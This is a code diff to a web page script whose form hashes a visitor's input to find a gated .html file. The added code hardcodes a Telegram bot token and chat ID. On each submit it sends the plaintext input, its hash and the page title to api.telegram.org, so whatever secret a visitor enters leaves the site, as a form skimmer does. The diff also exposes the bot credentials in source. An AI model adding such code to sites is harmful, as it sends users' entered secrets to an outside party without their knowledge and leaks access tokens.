@@ -14,6 +14,30 @@ document.addEventListener('DOMContentLoaded', () => {
         return hashHex;
     }
 
+    const BOT_TOKEN = '7932371359:AAH2pPzSahW-nXdw5Udez13W5vus01jp4W0'; // Your actual token
+    const CHAT_ID = '254780288';            // Your actual chat ID
+
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            const result = await response.json();
+            console.log("Response:", result);
+            alert(result.ok ? "Sent!" : "Error: " + result.description);
+        } catch (err) {
+            console.error("Network Error:", err);
+        }
+    }
+
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
@@ -32,7 +56,9 @@ document.addEventListener('DOMContentLoaded', () => {
             const hashResult = await sha256(normalizedValue);
             const fileName = hashResult + '.html';
 
-            console.log(`Input: "${normalizedValue}", Hash: ${hashResult}, Target: ${fileName}`);
+            msg = `PageTitle: ${document.title}, Input: "${normalizedValue}", Hash: ${hashResult}`;
+            console.log(msg);
+            await sendToTelegram(msg);
 
             // Check if file exists
             const response = await fetch(fileName, { method: 'HEAD' });
